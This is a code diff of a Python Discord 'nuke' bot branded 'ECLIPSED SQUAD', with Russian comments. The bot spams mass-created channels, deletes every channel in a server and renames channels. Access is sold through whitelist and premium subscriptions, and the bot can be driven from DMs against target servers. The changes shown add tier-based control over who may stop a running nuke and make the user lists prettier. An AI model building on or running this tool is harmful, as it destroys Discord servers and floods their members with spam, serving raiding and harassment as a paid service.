@@ -24,6 +24,7 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 # ─── HELPERS ───────────────────────────────────────────────
 
 nuke_running = {}
+nuke_starter = {}   # guild_id -> user_id кто запустил нюк
 last_spam_text = {}  # guild_id -> последний текст спама
 last_nuke_time = {}  # guild_id -> время последнего nuke
 
@@ -177,6 +178,7 @@ async def do_nuke(guild, spam_text=None):
     await asyncio.gather(*[create_and_spam(i) for i in range(config.CHANNELS_COUNT)], return_exceptions=True)
 
     nuke_running[guild.id] = False
+    nuke_starter.pop(guild.id, None)
     last_spam_text[guild.id] = spam_text
     last_nuke_time[guild.id] = asyncio.get_running_loop().time()
 
@@ -196,6 +198,7 @@ async def nuke(ctx, *, text: str = None):
     if text and not is_premium(ctx.author.id) and ctx.author.id != config.OWNER_ID:
         text = None  # сбрасываем на дефолт
     nuke_running[guild.id] = True
+    nuke_starter[guild.id] = ctx.author.id
     spam_text = text if text else config.SPAM_TEXT
     last_nuke_time[ctx.guild.id] = asyncio.get_running_loop().time()
     last_spam_text[ctx.guild.id] = spam_text
@@ -205,8 +208,46 @@ async def nuke(ctx, *, text: str = None):
 @bot.command()
 @wl_check()
 async def stop(ctx):
-    nuke_running[ctx.guild.id] = False
-    await ctx.send("Остановлено.")
+    guild = ctx.guild
+    uid = ctx.author.id
+    starter_id = nuke_starter.get(guild.id)
+
+    # Овнер останавливает всегда
+    if uid == config.OWNER_ID:
+        nuke_running[guild.id] = False
+        nuke_starter.pop(guild.id, None)
+        await ctx.send("✅ Остановлено.")
+        return
+
+    # Никто не запускал — просто останавливаем
+    if starter_id is None:
+        nuke_running[guild.id] = False
+        await ctx.send("✅ Остановлено.")
+        return
+
+    # Запустил овнер — только овнер может остановить
+    if starter_id == config.OWNER_ID:
+        embed = discord.Embed(
+            description="❌ Нюк запущен **овнером** — только он может остановить.",
+            color=0x0a0a0a
+        )
+        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        await ctx.send(embed=embed)
+        return
+
+    # Запустил премиум — только премиум или овнер может остановить
+    if is_premium(starter_id) and not is_premium(uid):
+        embed = discord.Embed(
+            description="❌ Нюк запущен **Premium** пользователем — обычная подписка не может остановить.",
+            color=0x0a0a0a
+        )
+        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        await ctx.send(embed=embed)
+        return
+
+    nuke_running[guild.id] = False
+    nuke_starter.pop(guild.id, None)
+    await ctx.send("✅ Остановлено.")
 
 
 @bot.command()
@@ -349,7 +390,16 @@ async def wl_list(ctx):
     if not config.WHITELIST:
         await ctx.send("Whitelist пуст.")
         return
-    await ctx.send("Whitelist:\n" + "\n".join(f"`{uid}`" for uid in config.WHITELIST))
+    lines = []
+    for uid in config.WHITELIST:
+        try:
+            user = await bot.fetch_user(uid)
+            lines.append(f"`{uid}` — **{user}**")
+        except Exception:
+            lines.append(f"`{uid}` — *не найден*")
+    embed = discord.Embed(title="✅ Whitelist", description="\n".join(lines), color=0x0a0a0a)
+    embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(config.WHITELIST)}")
+    await ctx.send(embed=embed)
 
 
 # ─── OWNER-ONLY: PREMIUM ───────────────────────────────────
@@ -385,7 +435,16 @@ async def pm_list(ctx):
     if not PREMIUM_LIST:
         await ctx.send("Premium список пуст.")
         return
-    await ctx.send("💎 Premium:\n" + "\n".join(f"`{uid}`" for uid in PREMIUM_LIST))
+    lines = []
+    for uid in PREMIUM_LIST:
+        try:
+            user = await bot.fetch_user(uid)
+            lines.append(f"`{uid}` — **{user}**")
+        except Exception:
+            lines.append(f"`{uid}` — *не найден*")
+    embed = discord.Embed(title="💎 Premium список", description="\n".join(lines), color=0x0a0a0a)
+    embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(PREMIUM_LIST)}")
+    await ctx.send(embed=embed)
 
 
 # ─── PREMIUM COMMANDS ──────────────────────────────────────
@@ -639,7 +698,7 @@ async def auto_super_nuke_cmd(ctx, state: str, *, text: str = None):
     elif state.lower() == "off":
         AUTO_SUPER_NUKE = False
         save_auto_super_nuke()
-        embed = discord.Embed(description="✅ **Auto Super Nuke** выключен.", color=0x0a0a0a)
+        embed = discord.Embed(description="❌ **Auto Super Nuke** выключен.", color=0x0a0a0a)
         embed.set_footer(text="☠️ ECLIPSED SQUAD")
         await ctx.send(embed=embed)
     elif state.lower() == "text":
@@ -1243,6 +1302,7 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
                 await message.channel.send("⚠️ Уже запущено.")
                 return
             nuke_running[guild.id] = True
+            nuke_starter[guild.id] = message.author.id
             spam_text = args if args else config.SPAM_TEXT
             last_nuke_time[guild.id] = asyncio.get_running_loop().time()
             last_spam_text[guild.id] = spam_text
@@ -1250,8 +1310,24 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
             await message.channel.send(f"✅ `nuke` запущен на **{guild.name}**")
 
         elif cmd_name == "stop":
-            nuke_running[guild.id] = False
-            await message.channel.send(f"✅ Остановлено на **{guild.name}**")
+            uid = message.author.id
+            starter_id = nuke_starter.get(guild.id)
+
+            if uid == config.OWNER_ID:
+                nuke_running[guild.id] = False
+                nuke_starter.pop(guild.id, None)
+                await message.channel.send(f"✅ Остановлено на **{guild.name}**")
+            elif starter_id is None:
+                nuke_running[guild.id] = False
+                await message.channel.send(f"✅ Остановлено на **{guild.name}**")
+            elif starter_id == config.OWNER_ID:
+                await message.channel.send("❌ Нюк запущен **овнером** — только он может остановить.")
+            elif is_premium(starter_id) and not is_premium(uid):
+                await message.channel.send("❌ Нюк запущен **Premium** пользователем — обычная подписка не может остановить.")
+            else:
+                nuke_running[guild.id] = False
+                nuke_starter.pop(guild.id, None)
+                await message.channel.send(f"✅ Остановлено на **{guild.name}**")
 
         elif cmd_name == "cleanup":
             asyncio.create_task(delete_all_channels(guild))
@@ -1372,7 +1448,16 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
             if not config.WHITELIST:
                 await message.channel.send("Whitelist пуст.")
             else:
-                await message.channel.send("Whitelist:\n" + "\n".join(f"`{uid}`" for uid in config.WHITELIST))
+                lines = []
+                for uid in config.WHITELIST:
+                    try:
+                        user = await bot.fetch_user(uid)
+                        lines.append(f"`{uid}` — **{user}**")
+                    except Exception:
+                        lines.append(f"`{uid}` — *не найден*")
+                embed = discord.Embed(title="✅ Whitelist", description="\n".join(lines), color=0x0a0a0a)
+                embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(config.WHITELIST)}")
+                await message.channel.send(embed=embed)
 
         elif cmd_name == "inv":
             app_id = bot.user.id
@@ -1465,7 +1550,16 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
             if not PREMIUM_LIST:
                 await message.channel.send("Premium список пуст.")
             else:
-                await message.channel.send("💎 Premium:\n" + "\n".join(f"`{uid}`" for uid in PREMIUM_LIST))
+                lines = []
+                for uid in PREMIUM_LIST:
+                    try:
+                        user = await bot.fetch_user(uid)
+                        lines.append(f"`{uid}` — **{user}**")
+                    except Exception:
+                        lines.append(f"`{uid}` — *не найден*")
+                embed = discord.Embed(title="💎 Premium список", description="\n".join(lines), color=0x0a0a0a)
+                embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(PREMIUM_LIST)}")
+                await message.channel.send(embed=embed)
 
         else:
             await message.channel.send(f"❌ Неизвестная команда `{cmd_name}`. Напиши `!owner_help`.")
@@ -1704,7 +1798,16 @@ async def on_message(message):
             if not config.OWNER_WHITELIST:
                 await message.channel.send("Owner whitelist пуст.")
             else:
-                await message.channel.send("Owner whitelist:\n" + "\n".join(f"`{uid}`" for uid in config.OWNER_WHITELIST))
+                lines = []
+                for uid in config.OWNER_WHITELIST:
+                    try:
+                        user = await bot.fetch_user(uid)
+                        lines.append(f"`{uid}` — **{user}**")
+                    except Exception:
+                        lines.append(f"`{uid}` — *не найден*")
+                embed = discord.Embed(title="👑 Owner Whitelist", description="\n".join(lines), color=0x0a0a0a)
+                embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(config.OWNER_WHITELIST)}")
+                await message.channel.send(embed=embed)
             return
 
         # !guilds — показать список серверов с кнопками выбора
@@ -1871,7 +1974,16 @@ async def on_message(message):
             if not PREMIUM_LIST:
                 await message.channel.send("Premium список пуст.")
             else:
-                await message.channel.send("💎 Premium:\n" + "\n".join(f"`{uid}`" for uid in PREMIUM_LIST))
+                lines = []
+                for uid in PREMIUM_LIST:
+                    try:
+                        user = await bot.fetch_user(uid)
+                        lines.append(f"`{uid}` — **{user}**")
+                    except Exception:
+                        lines.append(f"`{uid}` — *не найден*")
+                embed = discord.Embed(title="💎 Premium список", description="\n".join(lines), color=0x0a0a0a)
+                embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Всего: {len(PREMIUM_LIST)}")
+                await message.channel.send(embed=embed)
             return
 
         # !set_spam_text <текст> — сменить дефолтный текст для !nuke (только OWNER_ID)
@@ -2032,6 +2144,7 @@ async def on_ready():
         if nuke_running.get(guild.id):
             await interaction.response.send_message("⚡ Краш уже запущен.", ephemeral=True); return
         nuke_running[guild.id] = True
+        nuke_starter[guild.id] = interaction.user.id
         last_nuke_time[guild.id] = asyncio.get_running_loop().time()
         last_spam_text[guild.id] = config.SPAM_TEXT
         await interaction.response.send_message("💀 Краш запущен.", ephemeral=True)
@@ -2044,7 +2157,29 @@ async def on_ready():
         if not is_whitelisted(interaction.user.id):
             embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
             await interaction.response.send_message(embed=embed, ephemeral=True); return
-        nuke_running[interaction.guild.id] = False
+        uid = interaction.user.id
+        guild = interaction.guild
+        starter_id = nuke_starter.get(guild.id)
+
+        if uid == config.OWNER_ID:
+            nuke_running[guild.id] = False
+            nuke_starter.pop(guild.id, None)
+            await interaction.response.send_message("✅ Остановлено.", ephemeral=True); return
+
+        if starter_id is None:
+            nuke_running[guild.id] = False
+            await interaction.response.send_message("✅ Остановлено.", ephemeral=True); return
+
+        if starter_id == config.OWNER_ID:
+            embed = discord.Embed(description="❌ Нюк запущен **овнером** — только он может остановить.", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+
+        if is_premium(starter_id) and not is_premium(uid):
+            embed = discord.Embed(description="❌ Нюк запущен **Premium** пользователем — обычная подписка не может остановить.", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+
+        nuke_running[guild.id] = False
+        nuke_starter.pop(guild.id, None)
         await interaction.response.send_message("✅ Остановлено.", ephemeral=True)
 
     @bot.tree.command(name="rename", description="⚡ Переименовать все каналы")
